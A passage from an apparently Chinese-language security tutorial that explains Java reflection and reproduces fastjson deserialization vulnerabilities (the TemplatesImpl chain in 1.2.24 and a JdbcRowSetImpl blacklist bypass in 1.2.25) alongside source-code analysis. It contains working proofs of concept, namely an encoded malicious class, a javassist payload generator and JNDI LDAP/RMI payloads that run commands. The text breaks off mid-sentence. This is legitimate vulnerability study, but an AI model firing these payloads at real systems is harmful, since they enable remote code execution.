运行结果如下：![](../../.resource/remote/6b259d4963f52ece9f4cdc26e998ced819c5791312644c2dc90ab7531aa13a59.png)可以看到，我们一开始设置人的名字为张三，年龄为`20`，然后我们通过`setAge`方法来修改`Person`的`Age`属性，把年龄改成`30`。但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到`Java`反射技术。我们可以修改上面的`Main.py`为如下内容：

```
package org.example;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        // 获取Person类的Class对象
        Class<?> clazz = Class.forName("org.example.Person");

        // 创建Person对象
        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
        Object person = constructor.newInstance("张三", 20);

        // 调用Person对象的sayHello方法
        Method method = clazz.getMethod("sayHello");
        method.invoke(person);

        // 修改Person对象的age属性
        Field field = clazz.getDeclaredField("age");
        field.setAccessible(true);
        field.set(person, 30);

        // 输出修改后的Person对象信息
        System.out.println(person);
    }
}


```

这样我们就可以来动态创建对象、调用方法以及修改属性等。

#### 问题：我还是觉得你给出的例子体现不出灵活，怎么办？

不急，我们来看这么个例子：假设我们有一个配置文件，里面记录了类的名称、方法名、属性名等信息，我们可以在运行时读取配置文件，然后使用`Java`反射机制来创建对象、调用方法、修改属性等。这样就可以实现在不修改代码的情况下，根据配置文件来动态地创建对象、调用方法、修改属性，这样不就是很灵活很方便了么？我们来尝试用代码实现下。先建立一个配置文件，比如叫做`config.properties`，填写如下信息：

```
class=org.example.Person
method=sayHello
field=age
value=30
name=W01fh4cker


```

然后修改`Main.java`：

```
package org.example;

import java.io.FileInputStream;
import java.util.Properties;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        // 读取配置文件
        Properties props = new Properties();
        props.load(new FileInputStream("config.properties"));

        // 获取类的名称、方法名、属性名、属性值、姓名
        String className = props.getProperty("class");
        String methodName = props.getProperty("method");
        String fieldName = props.getProperty("field");
        String fieldValue = props.getProperty("value");
        String name = props.getProperty("name");

        // 获取类的Class对象
        Class<?> clazz = Class.forName(className);

        // 获取类的有参构造方法
        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);

        // 创建类的对象
        Object obj = constructor.newInstance(name, 0);

        // 调用方法
        Method method = clazz.getMethod(methodName);
        method.invoke(obj);

        // 修改属性
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, Integer.parseInt(fieldValue));

        // 输出修改后的对象信息
        System.out.println(obj);
    }
}


```

运行结果为：![](../../.resource/remote/bfa70f3a28bd9e349a46a89806650b859a4e98e477a422904b610ded24694756.png)

### （2）【关键！】和漏洞之间的联系？

前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用`java.lang.runtime`来执行命令？例如我们平时经常这么玩：

```
package org.example;

import org.apache.commons.io.IOUtils;

public class Main {
    public static void main(String[] args) throws Exception {
        System.out.println(IOUtils.toString(Runtime.getRuntime().exec("calc.exe").getInputStream(), "UTF-8"));
    }
}


```

要运行上述代码，需要在 maven 中引入如下依赖：

```
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.11.0</version>
</dependency>


```

需要注意的是，要在上述依赖的上线加入`<dependencies></dependencies>`，如下图，然后点击如下图标来自动安装依赖：![](../../.resource/remote/4b9cba6a059dd35873795f6e4dca27c0b333d33d26342c74beb3056c83fbe3f7.png)![](../../.resource/remote/4d82e4aca85213f57baad9ca646a1d66435f7d043ebba958dc43d74b2a15008e.png)然后运行程序，就会弹出计算器了：![](../../.resource/remote/6821d851e7604e0b79051413cc813ea5a4d7147a66abeec9debfa9b478b3e4dc.png)这么做不就是可以执行命令了吗，为什么还要搞反射呢？**原来，**`**Java**`**安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取**`**Java**`**的安全权限。获取**`**Java**`**的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取**`**Java**`**的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过**`**Java**`**安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是**`**Java**`**安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。**原来如此！好了，现在来学习如何使用反射调用`java.lang.runtime`来执行命令，由于 Java9 之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高`Java`应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用`Java8`。我们先看如下代码：

```
// Java version: 8
package org.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        Method execMethod = runtimeClass.getMethod("exec", String.class);
        Process process = (Process) execMethod.invoke(Runtime.getRuntime(), "calc.exe");
        InputStream in = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}


```

成功执行：![](../../.resource/remote/8a8f313405a9085fd778a4e4f526300bea4ac66b007ba528ccc606d13c9d3cae.png)然后再看在`Java17`下的执行反射的代码：

```
// // Java version: 17
package org.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class Main {
    public static void main(String[] args) throws Throwable {
        // 获取Runtime类对象
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        MethodHandle execMethod = MethodHandles.lookup().findVirtual(runtimeClass, "exec", MethodType.methodType(Process.class, String.class));
        Process process = (Process) execMethod.invokeExact(Runtime.getRuntime(), "calc.exe");
        InputStream in = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}


```

执行结果：![](../../.resource/remote/c6a91371c286c619e7ae5559621aabcc66499c49478dfc8666fedf757b39f08a.png)

二、漏洞学习
======

1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习 TemplatesImpl 链的相关知识）
-------------------------------------------------------------------

### （1）漏洞简单复现

我们看以下案例：首先创建一个`maven`项目、导入`Fastjson1.2.23`并自动下载相关依赖（怎么自动下载的见上文配图）：![](../../.resource/remote/0dbbdb6d979ab9d7eb90f0645f4615b105d678fad3a348710d9f4fc702538834.png)然后写入如下代码至`Main.java`（此时已经不需要`Person.java`了）：

```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        ParserConfig config = new ParserConfig();
        String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ \}\}";
        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
    }
}


```

运行之后直接弹出计算器：![](../../.resource/remote/da7d40bf1a0f427390f62d620824700384c26512f9e083d34f91ebb8723a7077.png)

### （2）漏洞成因分析

上面的`text`里面的`_bytecodes`的内容是以下内容编译成字节码文件后（`.class`）再`base64`编码后的结果：

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}


```

可以看到，我们通过以上代码直接定义类`Test`，并在类的构造方法中执行`calc`的命令；至于为什么要写上述代码的第`14`-`21`行，因为`Test`类是继承`AbstractTranslet`的，上述代码的两个`transform`方法都是实现`AbstractTranslet`接口的抽象方法，因此都是需要的；具体来说的话，第一个`transform`带有`SerializationHandler`参数，是为了把`XML`文档转换为另一种格式，第二个`transform`带有`DTMAxisIterator`参数，是为了对`XML`文档中的节点进行迭代。**总结：**对于上述代码，应该这么理解：建立`Test`类，并让其继承`AbstractTranslet`类，然后通过`Test t = new Test();`来初始化，这样我就是假装要把`xml`文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行`calc`，所以会弹出计算器。

#### ①问题 1：为什么要继承`AbstractTranslet`类？

参考`Y4tacker`师傅的文章：

> https://blog.csdn.net/solitudi/article/details/119082164

但是在实战场景中，`Java`的`ClassLoader`类提供了`defineClass()`方法，可以把字节数组转换成`Java`类的示例，但是这里面的方法的作用域是被`Protected`修饰的，也就是说这个方法只能在`ClassLoader`类中访问，不能被其他包中的类访问：![](../../.resource/remote/50ce83cb5826c8f4a0594cfe5b394cbec3742942061ff4ceb66e6f755a815bbb.png)但是，在`TransletClassLoader`类中，`defineClass`调用了`ClassLoader`里面的`defineClass`方法：![](../../.resource/remote/b8ec5ed319973a4704220f99b8e8ae19fb9e50b82b1ee6e11711a4ff85f24a9a.png)然后追踪`TransletClassLoader`，发现是`defineTransletClasses`：![](../../.resource/remote/026f259e66c96492672ebf444a7188ed4c111fbd38fc148d8d07b716407118e5.png)再往上，发现是`getTransletInstance`：![](../../.resource/remote/0de90b6b044a6e427afb7b3a27b436819424988f52e4c48b27b7d4fe45b5ded3.png)到此为止，要么是`Private`修饰要么就是`Protected`修饰，再往上继续追踪，发现是`newTransformer`，可以看到此时已经是`public`了：![](../../.resource/remote/e3045b134b1022d0ce25648b6235ea388e7aaaabd20cebfe639b018d301fa318.png)因此，我们的利用链是：

```
TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()


```

基于此，我们可以写出如下`POC`：

```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class Main {
    public static class test{
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";

        cc.makeClassInitializer().insertBefore(cmd);

        String randomClassName = "W01fh4cker" + System.nanoTime();
        cc.setName(randomClassName);

        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        try {
            byte[] evilCode = cc.toBytecode();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{"+
                    "\"@type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'W01h4cker',"+
                    "'_tfactory':{ },"+
                    "'_outputProperties':{ }"+
                    "}\n";
            ParserConfig config = new ParserConfig();
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


```

这段代码就可以动态生成恶意类，执行效果如下：![](../../.resource/remote/10492e340ddfebace426712e9bd081ffbdfaec1265dbaaf138e0c716da424396.png)

#### ②为什么要这么构造`json`？

可以看到，我们最终构造的 json 数据为：

```
{
 "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
 "_bytecodes": ["yv66vgAAADQA...CJAAk="],
 "_name": "W01fh4cker",
 "_tfactory": {},
 "_outputProperties": {},
}


```

为什么这么构造呢？还是直接看`defineTransletClasses`这里：![](../../.resource/remote/e683ab7c00fbbba83ce2107c7399807958ce508e21f03a32c319aa9d406c96a3.png)可以看到，逻辑是这样的：先判断`_bytecodes`是否为空，如果不为空，则执行后续的代码；后续的代码中，会调用到自定义的`ClassLoader`去加载`_bytecodes`中的`byte[]`，并对类的父类进行判断，如果是`ABSTRACT_TRANSLET`也就是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，那么就把类成员属性的`_transletIndex`设置成当前循环中的标记位，第一次调用的话，就是`class[0]`。可以看到，这里的`_bytecodes`和`_outputProperties`都是类成员变量。同时，`_outputProperties`有自己的`getter`方法，也就是`getOutputProperties`。![](../../.resource/remote/c905d6b4529ac9b20dbbc5ee9922a164aa1366a83946e1294a3177abb1bf4344.png)**总结：说详细一点，**`**TemplatesImpl**`**利用链的整体思路如下：****构造一个**`**TemplatesImpl**`**类的反序列化字符串，其中**`**_bytecodes**`**是我们构造的恶意类的类字节码，这个类的父类是**`**AbstractTranslet**`**，最终这个类会被加载并使用**`**newInstance()**`**实例化。在反序列化过程中，由于**`**getter**`**方法**`**getOutputProperties()**`**满足条件，将会被**`**fastjson**`**调用，而这个方法触发了整个漏洞利用流程：**`**getOutputProperties()**`** -> **`**newTransformer()**`** -> **`**getTransletInstance()**`** -> **`**defineTransletClasses()**`** / **`**EvilClass.newInstance()**`**。****限制条件也很明显：需要代码中加了**`Feature.SupportNonPublicField`。

2. fastjson 1.2.25 反序列化漏洞（学习 JdbcRowSetImpl 链的相关知识）
---------------------------------------------------

### （1）黑白名单机制介绍

众所周知，在`fastjson`自爆`1.2.24`版本的反序列化漏洞后，`1.2.25`版本就加入了黑白名单机制。例如我们更换并下载`1.2.25`版本的`fastjson`，然后再去执行原来的`poc`：![](../../.resource/remote/d4a2e1617033c2289ab1a9637749c0bad83a8229b1bf63e5e61617a9b6b71335.png)就会提示我们`autoType is not support`：![](../../.resource/remote/617ed6c24cfdd99c5072c7cd630f3f44f814ff80d38dcb4dca3ecaf82906c793.png)查看源码可以发现这里定义了反序列化类的黑名单：![](../../.resource/remote/e204204898ecc24d9a26e7620a5b96802f457c0f0d5cf2fa54600afa4e9f81a2.png)具体如下：

```
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework


```

接下来我们定位到`checkAutoType()`方法，看一下它的逻辑：如果开启了`autoType`，那么就先判断类名在不在白名单中，如果在就用`TypeUtils.loadClass`加载，如果不在就去匹配黑名单：![](../../.resource/remote/9961b9f8ec9f339da510a180b7e927a6e319b22abe3ac926999d88d3ccdae41b.png)如果没开启`autoType`，则先匹配黑名单，然后再白名单匹配和加载；![](../../.resource/remote/c19cf559ef49107a4adae980dea6ab8a663cbe7e138a55933cae770c3a133c61.png)最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了`autoType`或者`expectClass`不为空也就是指定了`Class`对象时才会调用`TypeUtils.loadClass`加载，否则`fastjson`会默认禁止加载该类。我们跟进一下这里的`loadClass`方法：![](../../.resource/remote/3f10a354147e7f68b0da40bc0bf2fb99c231b6450cf1fa5d32ae01567735caee.png)问题就出在这里：![](../../.resource/remote/ec9e814455646591c05e53254258233f1a63f30f0b185831849ace3710e8d5ae.png)我们来仔细看下上图红框中的代码，代码的含义是：如果类名的字符串以`[`开头，则说明该类是一个数组类型，需要递归调用`loadClass`方法来加载数组元素类型对应的`Class`对象，然后使用`Array.newIntrance`方法来创建一个空数组对象，最后返回该数组对象的`Class`对象；如果类名的字符串以`L`开头并以`;`结尾，则说明该类是一个普通的`Java`类，需要把开头的`L`和结尾的`;`给去掉，然后递归调用`loadClass`。

### （2）黑白名单绕过的复现

基于以上的分析，我们可以发现，只要我们把`payload`简单改一下就可以绕过。我们需要先开启默认禁用的`autoType`，有以下三种方式：

```
使用代码进行添加：ParserConfig.getGlobalInstance().addAccept("org.example.,org.javaweb.");或者ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.
在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.


```

我们先去`[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)`下载个`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`，然后启动利用工具：

```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"


```

选择下面的`JDK 1.8`的：![](../../.resource/remote/e3c7c318c4a35475e9d719f4ff8c2015c5d6a8667f6929b3ff1b91eaf5d59894.png)然后在`Main.py`中写入如下代码：

```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/ppcjug\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}


```

![](../../.resource/remote/4822d87ad1fa03ac7b8108973e4315d5a570a3069590a8194d8c320b81a19a38.png)以上为第一种`poc`，在`JDK 8u181`下使用`ldap`测试成功，使用`rmi`测试失败。除此之外，另一种`poc`则需要满足漏洞利用条件为`JDK 6u113`、`7u97` 和 `8u77`之前，例如我们这里重新新建一个项目，并从`[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)`处下载`jdk-8u65-windows-x64.exe`并安装。然后利用新安装的`jdk 8u65`来启动`jndi exploit`：

```
"C:\Program Files\Java\jdk1.8.0_65\bin\java.exe" -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"


```

导入`fastjson1.2.25`：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjson_8u66_1_2_25</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.25</version>
        </dependency>
    </dependencies>
</project>


```

在`Main.java`中写入如下内容：

```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}


```

![](../../.resource/remote/930aef10ccb00bfe0ec82a654c4567044fb93ad9ca51d3dcf16c9331cc30be8c.png)image.png

### （3）对两种 poc 绕过手法的分析

首先来说说限制，基于`JNDI+RMI`或`JDNI+LADP`进行攻击，会有一定的`JDK`版本限制。

```
RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113
LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191


```

![](../../.resource/remote/a84b48dda6e235220a9e020c37bbd784b5f8edbda0e5c80b0430eae7ab5733bf.png)image.png

#### ①第一种 poc（1.2.25-1.2.47 通杀！！！）

然后我们先来看**第一种**`poc`。我们仔细欣赏下第一种`poc`的`payload`：

```
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1/exp","autoCommit":true\}\}


```

我们会发现，加上`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`就会绕过原本的`autoType`，由此我们可以猜测，针对未开启`autoType`的情况，`fastjson`的源代码中应该是有相关方法去针对处理的，并且利用我们的这种方式，正好可以对应上。于是我们直接去查看源代码，翻到`checkAutoType`的地方，可以看到，如果没开启`autoType`，就会有以下两种加载方式：![](../../.resource/remote/d0f201f42ae9977cad4baeb50acc8956555305796e89ccb1b73a8f72a8c98a20.png)第一种是从`mappings`里面获取，也就是上图中的第`727`行代码，点进去之后可以看到：![](../../.resource/remote/01f98c2f30c69d2969dba8e197f1eeec57c7fffb5c31d3a2cc4ab0068d82a3e0.png)如果获取不到就采用第二种方法，也就是第`728`-`730`行代码，从`deserializers`中获取。`deserializers`是什么呢？可以看`fastjson-1.2.25.jar!\com\alibaba\fastjson\parser\ParserConfig.class`的第`172`-`241`行，里面是内置的一些类和对应的反序列化器。但是`deserializers`是`private`类型的，我们搜索`deserializers.put`，发现当前类里面有一个`public`的`putDeserializer`方法，可以向`deserializers`中添加新数据：![](../../.resource/remote/1ec2f56efec8d4bf5c83e89ca8e93890aafe33a1bed53a98784d475df4110d10.png)于是我们全局搜索该方法，发现就一个地方调用了，而且没办法寻找利用链：![](../../.resource/remote/657fc17bb5b82840093e6aec88ecc055a3a5fa9d95aee220b4984736b38441c4.png)![](../../.resource/remote/45db886cb24ea7304552dc7906d9ad3a0dcfe11d244538dbb21c007bb36ea8c1.png)所以继续看第一种方法，从`mappings`获取的。可以看到，`mappings`这里也是`private`：![](../../.resource/remote/b7842feb492271b940af45734dc496c332162c796cb6ddcfca2e701e22a01d23.png)搜索`mappings.put`，可以看到在`TypeUtils.loadClass`中有调用到：![](../../.resource/remote/0a23065aa4376668ab5334049592856b5f58d7cdf10aa963e2d3dc832a6eb728.png)于是我们全局搜索，可以看到有如下五处调用：![](../../.resource/remote/55b9f32e82af4c93593a981cebeb18e289e2b1bedbee101e594906a759b31e9f.png)我们一个个看。第一个需要开启`autoType`：![](../../.resource/remote/185828f19ddfd13691a885635002d4288189eb3cdcad94564af89680a59d98ba.png)第二个要在白名单内，第三个要开启`autoType`：![](../../.resource/remote/9c719ba3f40e4da5caa774e17c07eecbf4c4611c74a1ec1e7c1c3308a9603cda.png)第四个是在`MiscCodec.deserialze`中的，貌似没什么限制，我们先放一边：![](../../.resource/remote/f105a50eb102c1416be8b769e71426959689dd980b4e91b0ed8a8322d8482ada.png)第五个没办法利用，因为传不了参数，跳过：![](../../.resource/remote/fb8654b973763f469452ee9b4166d1b5665f01f40c0681a356b1d3ee5ab03807.png)也就是说，只能从`MiscCodec.deserialze`这里来寻找突破口了。翻到`MiscCodec.java`的最上面可以看到，这个`MiscCodec`是继承了`ObjectSerializer`和`ObjectDeserializer`的：![](../../.resource/remote/0fdf36da823666c0d946b878460ef4326c8e07353715c1011e7a842bd57d9b63.png)因此，可以判断，这个`MiscCodec`应该是个反序列化器，于是我们去之前的`deserializers`中看看都有谁用了：![](../../.resource/remote/4fdcfe1563d75644784deabcd513e2c93c235a58f88d6283504d21931d090b73.png)挺多的，结合`MiscCodec`中一堆的`if`语句，可以判断，一些简单的类都被放在这里了。![](../../.resource/remote/68b620a14f7edc3ddf08b27c02afb6c60c2374f769ebb813b87eb7ec8d4824c8.png)我们再来看这行代码：![](../../.resource/remote/a3aaf20f268220c920b4996b3931e721946b3030f6fea17bf814f4396676977a.png)然后跟进`strVal`，看看是哪儿来的：![](../../.resource/remote/7c80027bb9459e8a1da6f29567de9450238a82f3d8480821bfda587d2288e281.png)继续跟进这个`objVal`：![](../../.resource/remote/ee600bdff9dc43a60bbb837bfa57155406ecaf6ab38d4fcae5daf99983f43c72.png)到这里就很明显了，那红框中的这段代码是什么意思呢？首先，代码中的`if`语句判断当前解析器的状态是否为`TypeNameRedirect`，如果是，则进入`if`语句块中进行进一步的解析。在`if`语句块中，首先将解析器的状态设置为`NONE`，然后使用`parser.accept(JSONToken.COMMA)`方法接受一个逗号`Token`，以便后续的解析器对其进行处理。接下来，使用`lexer.token()`方法判断下一个`Token`的类型，如果是一个字符串，则进入 if 语句块中进行进一步的判断。在 if 